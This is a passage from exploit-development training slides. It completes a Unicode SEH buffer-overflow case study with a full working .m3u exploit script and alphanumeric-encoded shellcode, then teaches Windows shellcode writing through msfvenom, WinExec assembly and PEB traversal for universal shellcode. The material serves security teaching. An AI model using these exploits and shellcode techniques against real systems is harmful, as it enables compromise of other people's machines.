it is a POP-POP-RET gadget at 0x004100F2.
We will overwrite SEH with:
• nSEH – 41 61 
• SEH – 41 F2 – which after transformation, will become 
the address of POP POP RET – 0x004100F2.
4.2 Unicode Exploitation Case Study
|  p.46
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
After Unicode transformation, those bytes will form the 
following instructions:
4.2 Unicode Exploitation Case Study
|  p.47
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
The only point of those instructions is to allow execution –
they are like „Unicode-friendly NOPs”. We are not really 
interested in their effect as long as they don’t crash the 
application, that’s why instructions like „PREFIX REPNE” is 
alright. 
You can try to find other instructions that will work in a 
similar manner.
4.2 Unicode Exploitation Case Study
|  p.48
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
In a Unicode buffer overflow, we do not jump over SEH – we 
walk over it, as we are overwriting it with an address that is 
likely to form an usable, harmless instruction.
This was almost impossible with a usual address; however, 
with a Unicode-friendly one, it is much easier.
4.2 Unicode Exploitation Case Study
|  p.49
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Let’s update our script and add some breakpoints after the 
SEH is executed so that we stop the execution.
4.2 Unicode Exploitation Case Study
|  p.50
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Let’s provide the application with the latest .m3u exploit.
The next step will be to find a reasonable place for future 
shellcode in the memory. We need to find a reference to our 
buffer in the memory and jump to it – for example, make a 
register point to it by modifying its current value. 
4.2 Unicode Exploitation Case Study
|  p.51
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Let’s investigate the application memory layout.
4.2 Unicode Exploitation Case Study
|  p.52
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
If we right-click on EAX, and choose “follow in stack”, then it will 
become clear that it holds a reference to the SEH structure. 
Additionally, there is our A-buffer in the lower addresses. If we 
will be able to decrease EAX a bit and then jump to it, we will 
start  executing our A-buffer! 
Of course, due to the Unicode transformation the available 
instruction set is limited – but let’s first try to decrease EAX using 
subtractions with following technique. 
4.2 Unicode Exploitation Case Study
|  p.53
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
This time the exploit will be modified first and then 
explained, so that you first see the result and purpose of the 
modifications in memory.
4.2 Unicode Exploitation Case Study
|  p.54
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Running such an exploit file gives us the following effect.
4.2 Unicode Exploitation Case Study
|  p.55
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
After restoring execution from the SEH, we need to pad its 
last byte with a NOP. In order to not malform it, a \x6E byte 
is added, which after being connected with a \x00 byte,  
originating from extending \x90 to Unicode, forms a 
harmless instruction set 0x006E00.
4.2 Unicode Exploitation Case Study
|  p.56
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
We can then perform the first operation on EAX. Both 
ADD/SUB operations are supported in the Unicode 
instruction set; however, as every number is extended with 
Unicode 00’s, we are only able to achieve multiplications of 
100h.
4.2 Unicode Exploitation Case Study
|  p.57
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Let’s perform two operations:
1. Add 13003700h, then pad it with \x6E so another 
harmless instruction is created in between
2. Then subtract 13003600h, so in the end the EAX is 
simply increased by 100h.
4.2 Unicode Exploitation Case Study
|  p.58
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
However, this is enough to make it point to a part of our D-
buffer!
That being said, if we right click on “EAX” and select “Follow 
on Stack”, we will see that we are not in the beginning of 
the D-buffer, but in some location away from its start.
4.2 Unicode Exploitation Case Study
|  p.59
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
However, regardless of the gap, there is still plenty of space to place a 
shellcode after the address that is currently pointed by EAX. 
4.2 Unicode Exploitation Case Study
|  p.60
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
While we will care about the gap later, let’s go ahead and 
finish the venetian shellcode by jumping to EAX.
In order to do so, we would normally use a “call EAX” 
instruction, but since it is not Unicode-friendly, we need to 
find a suitable replacement for it.
4.2 Unicode Exploitation Case Study
|  p.61
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
In this case, we will use PUSH EAX / RET padded by a 
venetian instruction (see below). Let’s see how it works.
4.2 Unicode Exploitation Case Study
|  p.62
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
After passing the exception to the program, we can see that 
we landed in the D-buffer and then the application 
encountered another exception. 
4.2 Unicode Exploitation Case Study
|  p.63
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
This is reasonable since this is not what we intended to 
execute. The visible breakpoints were unfortunately jumped 
over.
In order to hit them, we need to add an additional junk 
buffer before them; the jump over the beginning of the D-
buffer will end up in those breakpoints. 
4.2 Unicode Exploitation Case Study
|  p.64
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Let’s subtract the address where the D-buffer begins (including 
breakpoints) from the address that the EAX points to.
As per the below screenshot, the D-buffer partially starts at 
0x0012e294 , as there is one byte that is not part of the 
breakpoints.
4.2 Unicode Exploitation Case Study
|  p.65
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
The address that EAX points to is 0x0012E374. We will 
subtract the address of the beginning of the D-buffer from 
it.
4.2 Unicode Exploitation Case Study
|  p.66
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
The result is 224 decimal bytes. 
4.2 Unicode Exploitation Case Study
|  p.67
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Considering that Unicode transforms every character into 
its two bytes representation, our buffer should be 112 bytes 
long.
However, you can see that the starting address, which was 
our second subtraction operand, contains just one “\xcc” 
byte. The other byte at this address comes from previous 
data and not the breakpoint/D buffer.
4.2 Unicode Exploitation Case Study
|  p.68
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Therefore, the correct offset is 111 bytes. Let’s introduce 
this padding to the exploit and check the crash.
4.2 Unicode Exploitation Case Study
|  p.69
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Due to adding some additional bytes before the breakpoints, we 
now landed just in the beginning of the final buffer. 
4.2 Unicode Exploitation Case Study
|  p.70
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
We now have successfully redirected the execution flow to 
the area that we control. The last part will be adding 
shellcode.
In Unicode, we do not perform a bad character check – we 
know the character transformation logic, so in this case we 
will just use alphanumeric shellcode.
4.2 Unicode Exploitation Case Study
|  p.71
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Alphanumeric shellcode is a specific type of shellcode that 
is compatible only with Unicode exploits. It is created in a 
way, that upon being sent to target application and 
converted to Unicode, it creates a self-extracting shellcode. 
It also unpacks another set of instructions into the memory 
at runtime and then starts executing the real shellcode.
4.2 Unicode Exploitation Case Study
|  p.72
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
It is possible to create such a shellcode manually, instead 
we will use a regular shellcode and an automated encoder.
There are plenty of encoders available on the web, the most 
popular are the msfvenom alpha encoder and the original 
alpha encoders authored by SkyLined. 
4.2 Unicode Exploitation Case Study
|  p.73
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
We will use the alpha2 encoder. 
You can download copy of the alpha2 encoder from the link 
below.
https://packetstormsecurity.com/files/download/34447/al
pha2.tar.gz
4.2 Unicode Exploitation Case Study
|  p.74
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Download the tool to your Linux machine (preferably Kali as 
we need msfvenom too), and unpack and compile it using 
gcc, as follows.
4.2 Unicode Exploitation Case Study
|  p.75
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Generate a regular shellcode using msfvenom, as follows.
4.2 Unicode Exploitation Case Study
|  p.76
Then, feed the alpha2 encoder with it.
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Replace the breakpoints with the generated shellcode in the 
exploit, as follows.
4.2 Unicode Exploitation Case Study
|  p.77
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Outside of the debugger, try to 
open the crafted playlist. 
Calc.exe should be executed.
4.2 Unicode Exploitation Case Study
|  p.78
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Here is the full code of the exploit.
buffer = "\x41" * 536
# buffer
buffer += "\x61\x41" 
# POPAD + Alignment nSEH
buffer += "\xF2\x41" 
# POP/POP/RET SEH
#------------------------- ALIGN THE EAX TO POINT TO THE SHELLCODE PART -------------------#
buffer += "\x90"
# 
buffer += "\x6e" 
# venetian padding
buffer += "\x05\x37\x13" # add eax, 0x13003700
buffer += "\x6e" 
# venetian padding
buffer += "\x2d\x36\x13" # sub eax, 0x13003600
buffer += "\x6e" 
# venetian padding
buffer += "\x50" 
# push eax
buffer += "\x6e" 
# venetian padding
buffer += "\xc3" 
# ret
buffer += "\x90" * 111   # alignment 111 bytes
|  p.79
4.2 Unicode Exploitation Case Study
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
# msfvenom calc + alpha2
buffer += 
("PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZ
ABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLYXU2KPKPM0S059IUNQI0S44KPPNPTK2
2LLTKQBLT4K42MXLO6W0JNFNQKOFLOLQQ3LKRNLO0WQXOLMKQHGK2L2R2QGDK22N0TKPJOL4KPLLQD8ISO
XKQHQ0Q4K29O0KQZ3TK0IMHISNZOY4KP4TKKQXVNQKO6LWQHOLMKQ97OH9PCEL6LCSMJXOKCMNDRUJDQHT
KPXMTKQHSRFTKLLPKDKPXMLM1HSTKLD4KKQHP3YOTMTNDQKQK1QQIQJ0QKOYP1O1OPZ4KMBJKTM1M1ZM1D
M3U82KPKPKPPPQXNQ4KBOSWKO8UGKL06U5R261X5VF5WMEMKO9EOLKVCLKZ50KK9PRUKUGKOWLST2BO2JK
PQCKOZ5S331RLQSNNQUD81UM0A")
buffer += "\x90" * (5000 - len(buffer))
f = open('exploit.m3u','w');
f.write(buffer);
|  p.80
4.2 Unicode Exploitation Case Study
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
References
|  p.81
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
References
List of Unicode characters
alpha3
Building IA32 'Unicode-Proof' Shellcodes
Practical WIN32 and Unicode exploitation
https://en.wikipedia.org/wiki/List_of_Unicode_characters
https://github.com/SkyLined/alpha3
http://phrack.org/issues/61/11.html#article
https://www.blackhat.com/presentations/win-usa-04/bh-win-04-fx.pdf
|  p.82
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
References
Fuzzy Security on Unicode - Part 5: Unicode 0x00410041
Alpha2 Encoder
https://www.fuzzysecurity.com/tutorials/expDev/5.html
https://packetstormsecurity.com/files/download/34447/alpha2.tar.gz
|  p.83
© Caendra Inc. 2019
All Rights Reserved
Windows Shellcoding
S e c t i o n  0 2  |  M o d u l e  0 5
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Table of Contents
MODULE 05 | WINDOWS SHELLCODING
5.1 Basic Windows Shellcode
5.2 Universal Shellcode
|   p.2
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Learning Objectives
By the end of this module, you should have a better 
understanding of:
Why shellcoding is important
How to create different types of shellcode
|   p.3
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
5.1
Basic Windows 
Shellcode
|  p.4
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Shellcode is the most important part of every exploit. At the 
heart of it, it allows us to execute certain tasks that the 
exploit is meant to accomplish. When you use Metasploit 
against any software, the PAYLOAD option is in fact the 
shellcode that the exploit will be armed with. 
The easiest way to obtain a shellcode for your exploit is to 
search for it in on the web (e.g. shellstorm or cut if from 
existing exploits) or to simply generate it with msfvenom. 
5.1 Basic Windows Shellcode
|  p.5
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
These options are rather self-explanatory and do not require 
any advanced knowledge to make use of them.
However, there might be cases when some exploits do not 
work due to the shellcode behaving in an improper way or 
cases when you need to accomplish an uncommon task 
through your shellcode. For such cases, you should be 
capable of writing and debugging shellcode manually.
5.1 Basic Windows Shellcode
|  p.6
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Shellcode itself consists of raw processor opcodes. It’s not 
even assembly – it’s raw bytes that are responsible for 
executing certain tasks. That’s why it can be put in a user 
buffer and when transferring execution to it, certain things 
can be accomplished, (e.g. spawning a calc).
As the Assembly language is the closest thing to machine 
language, it is the best choice to write shellcode. How do 
we translate assembly to opcodes?
5.1 Basic Windows Shellcode
|  p.7
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
We need an Assembly compiler. For example, NASM will fit 
this role nicely. You can download it from the link below: 
https://www.nasm.us/pub/nasm/releasebuilds/?C=M;O=D
Simply pick the version that suits your OS.
5.1 Basic Windows Shellcode
|  p.8
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Compiling an Assembly file to a binary file that contains 
machine language opcodes is easy, and can be achieved 
with:
nasm.exe file.asm -o file.bin
|  p.9
5.1.1 Machine Language
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
The next step is to translate the .bin file that is a binary file 
into a hexadecimal representation of the contained bytes. 
This way, we can conveniently incorporate the desired 
opcodes into an exploit.
This can be done using an automatic tool. 
5.1.1 Machine Language
|  p.10
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Fortunately, there is a variety of such tools on the internet; 
for example: 
https://gist.github.com/superkojiman/11164279
5.1.1 Machine Language
|  p.11
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Let’s now compile a simple Assembly program (that does 
not do anything meaningful) just for the purpose of 
showing the process.
5.1.1 Machine Language
|  p.12
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Using this method, we will create the shellcode, but there 
are still some things to do until it is really functional.
5.1.1 Machine Language
|  p.13
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
On Linux, shellcode can be written using certain system 
calls. We essentially just need to fill registers with certain 
values and call a Linux syscall; syscalls allow us to 
communicate with the built-in Operating system functions 
(calls) like read(), write(), system(). On Windows, writing  
shellcode is a bit more complicated.
The Windows Operating System uses WinAPI in order to 
allow users to use certain functionalities. WinAPI is a set of 
functions that are stored in default system DLLs.
5.1.2 Calling Windows Functions
|  p.14
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
DLLs (Dynamic-Link Libraries) are files in a Windows 
executable format that contain functions. In order to make 
use of functions a DLL contains, an application needs to 
load that DLL to its own address space. 
Similarly to importing time in Python to use time.sleep, you 
need to load a DLL in order to use the functions it contains.
5.1.2 Calling Windows Functions
|  p.15
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Technically speaking, if a DLL contains some functions that 
can be used after loading the library, we say that this DLL 
Exports these functions. 
In order to use a DLL’s exported functions, a program that 
wants to utilize them must:
• Include a dll library in its address space (load it)
• Call the certain function by its name
5.1.2.1 Dynamic Link Libraries
|  p.16
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
For example, if we want to call the messageBox from a 
program, we need it to:
• Load the user32.dll library
• Call MessageBoxA with proper arguments
From a low-level Assembly perspective – first some 
instructions have to be executed to push function 
arguments on the stack. Then the function can be called, 
but it requires knowing its address. 
5.1.2.1 Dynamic Link Libraries
|  p.17
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
When an application loads a DLL library, it is mapped into 
the application’s memory. That means, it receives a certain 
address within that application’s address space.
Before Vista, Windows does not utilize ASLR, and that 
address is always the same for certain DLLs among the 
operating systems of the same service pack versions.
5.1.2.1 Dynamic Link Libraries
|  p.18
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Each DLL contains a map of the function it uses. Each 
function is available at a certain, static offset from the 
library base address. 
The function address in a DLL is called RVA (Relative Virtual 
Address). It is Relative to the base address at which the 
function’s parent DLL was mapped.
5.1.3 Within the Process Address Space
|  p.19
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
In order to view the address a certain function is mapped 
to, we can use immunity debugger during the application’s 
runtime. The debugger needs to be attached to it.
5.1.3 Within the Process Address Space
|  p.20
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Select “View -> Executable modules” and then right-click on 
a library and choose “View names”.
5.1.3 Within the Process Address Space
|  p.21
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
In the window, you can see 
all the functions that the 
module contains, along with 
their addresses.
5.1.3 Within the Process Address Space
|  p.22
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
For static checks, without launching a debugger, you can 
use the Arwin tool. 
Arwin is a simple software that uses Windows functions to 
locate a library, load it and get the address of the desired 
function that it contains.
5.1.3 Within the Process Address Space
|  p.23
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
You can download it from here: 
https://www.fuzzysecurity.com/tutorials/expDev/tools/arwin.rar
You can also fine the source code here: 
https://github.com/73696e65/windows-exploits/blob/master/arwin.c
5.1.3 Within the Process Address Space
|  p.24
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
We can use the precompiled tool from the first URL. 
See an example of how Arwin can be used below.
5.1.3 Within the Process Address Space
|  p.25
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
When a function is called in an application, we can see in 
the debugger that before the function call its arguments are 
pushed onto the stack together with the return address. 
5.1.4 Order of Arguments
|  p.26
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
If we want to call a system function from an Assembly 
perspective, we need to emulate this situation using push 
instructions. 
For example, the stack should look like:
[ESP +] [RETURN ADDR]
[ESP + 4] [FIRST ARGUMENT]
[ESP + 8] [SECOND ARGUMENT]
|  p.27
5.1.4 Order of Arguments
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
When arguments are on the stack, EIP should point to the 
target function. Then the function will be called with the 
proper parameters.
From a shellcode perspective, it should look like:
push Second_ARG
push First_ARG
push Return_address
call Function
|  p.28
5.1.4 Order of Arguments
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Assembly allows us to push a certain number to the stack, 
but not strings. Most functions require pointers to strings 
as a parameter. 
In order to obtain a pointer to a string we can:
5.1.4.1 The Problem with Strings
|  p.29
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
1. Find an occurrence of the desired string in memory and 
remember its address.
2. Push the string onto the stack and save a pointer to it.
The second method is far more reliable and it will be 
preferred during shellcode development. 
5.1.4.1 The Problem with Strings
|  p.30
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
For example, let’s consider the following assembly:
XOR EBX, EBX; EBX is now equal to 0
PUSH EBX; push 0 to the stack.
PUSH \x2e\x65\x78\x65; “.exe” - due to the endianness, we push 
the end of the string first. 
PUSH \x63\x61\x6c\x63; “calc”, the beginning of the string.
MOV ECX, ESP; Save the current value of ESP in ECX. The 
current value of ESP is the address of the beginning of the 
null-terminated string “calc.exe”. Since we will not decrease 
the stack among the shellcode, this address will stay the same
so we can save it in ECX.
|  p.31
5.1.4.1 The Problem with Strings
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Let’s now try to create a simple shellcode using the 
aforementioned examples. The shellcode will be 
WinExec()-based.
Winexec() is a function which is popular among shellcode 
developers. It works in similar manner as system() on 
Linux. It executes Windows programs provided in its 
arguments similarly to how you would type those to a cmd 
line. 
5.1.5 Writing Shellcode
|  p.32
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
You can read more about this function on Microsoft’s 
website.
https://docs.microsoft.com/en-
us/windows/win32/api/winbase/nf-winbase-winexec
5.1.5 Writing Shellcode
|  p.33
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
The last thing we need to write a working shellcode is to 
emulate a stack overflow. 
During stack overflow exploitation we are writing directly 
into the memory of the program. We can achieve the same 
effect using C/C++ on windows. 
5.1.5.1 Testing Shellcode
|  p.34
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Consider the following code.
5.1.5.1 Testing Shellcode
|  p.35
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
All this code does is allocate a portion of memory, make it 
executable, copy the shellcode in that place and then start 
executing it. 
It is worth having such an application for the purpose of 
testing shellcode before it is implemented in exploits. It is 
helpful when debugging an exploit, when you need to be 
sure that your shellcode works as expected.
5.1.5.1 Testing Shellcode
|  p.36
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Let’s try to paste a msfvenom generated shellcode into the said 
program and compile it in Dev-c++. You can use any compiler of 
choice, although in this case, we will use Dev-c++.
We need to exclude zeros as this will terminate our string, thus 
we instantly mark it as a bad character upon generation.
msfvenom -p windows/exec cmd=calc.exe exitfunc=thread -f c -b 
"\x00"
|  p.37
5.1.5.1 Testing Shellcode
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Let’s run the compiled program:
5.1.5.1 Testing Shellcode
|  p.38
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Great! It seems that the 
shellcode works as expected.
Since we now have all the 
required tools, let’s proceed to 
write shellcode from scratch.
5.1.5.1 Testing Shellcode
|  p.39
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
First, we need to figure out the Winexec() address. This can 
be done using Arwin, as follows.
5.1.5.2 Basic Shellcode
|  p.40
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Another thing to remember is that when we push strings 
onto the stack, we need to push them in reverse order due 
to endianness. So, when we want to push “calc.exe\0”, we 
in fact should:
• Push 0
• Push „exe.”
• Push „clac”
5.1.5.2 Basic Shellcode
|  p.41
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
The Assembly code that executes calc through Winexec() 
can be written in the following way.
5.1.5.2 Basic Shellcode
|  p.42
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
After executing calc, it smoothly exits using the 
ExitProcess() function. Now let’s compile it using Nasm.
5.1.5.2 Basic Shellcode
|  p.43
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
We’ll then extract the opcodes using bin2sc, as follows.
5.1.5.2 Basic Shellcode
|  p.44
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Now, let’s copy the opcodes to the shellcode tester and 
compile it.
5.1.5.2 Basic Shellcode
|  p.45
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Running the compiled program gives the following result.
5.1.5.2 Basic Shellcode
|  p.46
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
We are almost done. The last thing that needs to be 
accomplished is to make the shellcode gracefully exit, 
instead of causing a messy segmentation fault. 
We will add another part of shellcode after the calc is 
executed. First, let’s find the address of ExitProcess() using 
Arwin, as follows.
5.1.5.3 A Graceful Exit
|  p.47
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
We want the process to return 0, so we need to push 0 to 
the stack right before calling the ExitProcess().
5.1.5.3 A Graceful Exit
|  p.48
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Let’s compile it and extract the opcodes.
5.1.5.3 A Graceful Exit
|  p.49
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
We’ll then add it to the „shellcode tester” and run the 
compiled program.
5.1.5.3 A Graceful Exit
|  p.50
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Now the application does not 
display any errors – we see just 
calc being executed.
5.1.5.3 A Graceful Exit
|  p.51
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
5.2
Universal Shellcode
|  p.52
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
The shellcode we have just introduced is small and does not 
produce a memory corruption upon exit. However, it also has 
some disadvantages.
The main problem is that this shellcode contains hardcoded 
addresses, which means that it is usable only against a certain 
system version – in this case Windows XP SP1. 
As previously mentioned, all system DLLs are loaded at static 
addresses among the same service pack level.
5.2 Universal Shellcode
|  p.53
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Due to this, shellcode that works on XP SP1 is not usable 
against SP2 or SP3.
Our next step will be creating universal shellcode that will 
run on any service pack without hardcoding addresses. 
How that can be done?
5.2 Universal Shellcode
|  p.54
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Windows is a very well-organized system. Each process, 
apart from the program data, also contains some Operating 
System control elements.
Those elements are data organized in structures. 
Structures are C/C++ data types, which are similar to 
arrays.
5.2.1 Structured System
|  p.55
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Some of the structures are documented by Microsoft on 
their official website.
Another part of them have been reversed by other people 
and organizations and made publicly available. Those 
structures are called “undocumented” as officially, there is 
no documentation available for them.
5.2.1 Structured System
|  p.56
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Structures hold data in an organized manner – they are like 
tables in a database. Each field of a structure can be a 
different type, but they must be predefined.
As you already know, each data type has a specific size in 
bytes that cannot be exceeded. Knowing what data types 
are members (fields) of a structure gives you information 
on when a certain field starts and ends, and going further –
at which offset from the beginning of the structure a certain 
field it can be found. 
5.2.1 Structured System
|  p.57
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Unlike a database where all data types are known like 
varchar, timestamp, int, etc., data types in Windows 
structures are, in most cases, custom. 
They were created by Microsoft, so it is perfectly normal 
that a structure consists of data types that might be new to 
you. The only way to know what amount of memory is 
needed to store a certain data type is to read the 
documentation, or, if it’s not present, try to reverse engineer 
the structure.
5.2.1 Structured System
|  p.58
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Luckily in this module, we will rely on already reversed or 
documented structures. 
The certain size or name of each of them might be different 
from the usual C/C++ data types, but if you want to be 
comfortable with debugging and exploiting a Windows 
environment you should get used to them.
5.2.1 Structured System
|  p.59
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Lots of structures are nested in each other – Windows in 
fact is built on top of them. 
You will see in the upcoming slides that there are structures 
that contain structures that contain other structures… and 
they all are used to build a working, well-organized 
foundation for running a process in the Windows 
environment.
5.2.1 Structured System
|  p.60
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Similarly to the exception handler information, which used 
to be stored in FS:[0], there are other interesting information 
stored within process memory. 
One such interesting structure is the Process Environment 
Block (PEB).
5.2.2 Traversing the Metadata
|  p.61
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
https://kpmgsecurity.files.wordpress.com/2015/12/peb-structure-msdn.png
Its structure can be 
defined as follows.
5.2.2 Traversing the Metadata
|  p.62
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
The fields named “Reserved” are not documented.
However, the only interesting thing here for now are the 
offsets and data type sizes. If we are able to find the start 
of a structure, and if we know the offsets, we can navigate 
to any field it contains – even if its nested deep inside.
5.2.2 Traversing the Metadata
|  p.63
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
The idea behind all of these detailed information on 
structures is that if we can access PEB, it was discovered 
that it is possible to get the address of some libraries and 
functions contained in them. So, it will be possible to 
emulate Arwin during runtime and retrieve the current 
address of certain functions instead of hardcoding them.
Then, they can be further used within the shellcode.
5.2.2 Traversing the Metadata
|  p.64
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
The disadvantage is that the shellcode will grow in size. 
The advantage is that it will become universal and will be 
usable on all service packs of certain Windows OSs.
We will shortly present where certain interesting data lies 
starting from the address of the PEB. Then, we will proceed 
to turn it into real shellcode.
5.2.2 Traversing the Metadata
|  p.65
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-_teb
Windows structures can be traversed in the following way:
• The PEB address is held in the Thread Environment Block, 
0x30 bytes from its start. The address of  the TEB is held 
in the FS segment register and can be shellcoded (so we 
know the starting point).
• PEB + 0xC Bytes holds the pointer to PEB_LDR_DATA, 
which contains information about loaded DLLs, in the 
form of a doubly linked list.
5.2.2 Traversing the Metadata
|  p.66
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
• In PEB_LDR_DATA, 0x14 bytes from its beginning there is 
a pointer to the first DLL loaded in memory in a list 
named InMemoryOrderModuleList.
• On windows XP (all service packs), ntdll.dll and 
kernel32.dll reside in the second and third entries, 
respectively. Remember the Arwin tool which utilized 
kernel32.dll functions to get data about a function’s 
address? We can do the same in Assembly.
5.2.2 Traversing the Metadata
|  p.67
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
This can be achieved using the following Assembly code.
mov ebx, fs:0x30
; Get pointer to PEB
mov ebx, [ebx + 0x0C] ; Get pointer to PEB_LDR_DATA
mov ebx, [ebx + 0x14] ; Get pointer to first entry in InMemoryOrderModuleList
mov ebx, [ebx]
; Get pointer to second (ntdll.dll) entry in InMemoryOrderModuleList
mov ebx, [ebx]
; Get pointer to third (kernel32.dll) entry in InMemoryOrderModuleList
mov ebx, [ebx + 0x10] ; Get kernel32.dll base address
|  p.68
5.2.2 Traversing the Metadata
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
The code on the prior slide, when compiled, has a major 
disadvantage – it contains null bytes. 
Thus, it cannot be placed in any exploit buffer. In order to 
get rid of them, we need to refactor the code a bit.
5.2.2 Traversing the Metadata
|  p.69
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Luckily, it is not that complicated.
The result of the above piece of shellcode is the address of 
kernel32.dll being stored in the ebx register. Let’s now 
figure out how can we find the WinExec() address using it.
xor esi, esi
; esi = 0
mov ebx, [fs:30h + esi]  
; written this way to avoid null bytes
mov ebx, [ebx + 0x0C] 
mov ebx, [ebx + 0x14] 
mov ebx, [ebx]
mov ebx, [ebx]
mov ebx, [ebx + 0x10]
; ebx holds kernel32.dll base address
mov [ebp-8], ebx 
; var8 = kernel32.dll base address
|  p.70
5.2.2 Traversing the Metadata
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
A DLL file, a dynamic-link library, is a file in the PE (Portable 
Executable) format. Again, this file format has some 
structured metadata that can be traversed in order to obtain 
interesting information.
When speaking about a PE Executable file image, we can 
use the term RVA (Relative Virtual Address). RVA is the 
address relative to the beginning of the file image, so 
essentially, the offset from the base address. Also, when 
speaking about DLL’s, the term “Export” will often be used. 
5.2.3 Function Base Address
|  p.71
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
In short, DLL Export functions are the functions it contains, 
which can be used upon loading the library into the process 
memory.
5.2.3 Function Base Address
|  p.72
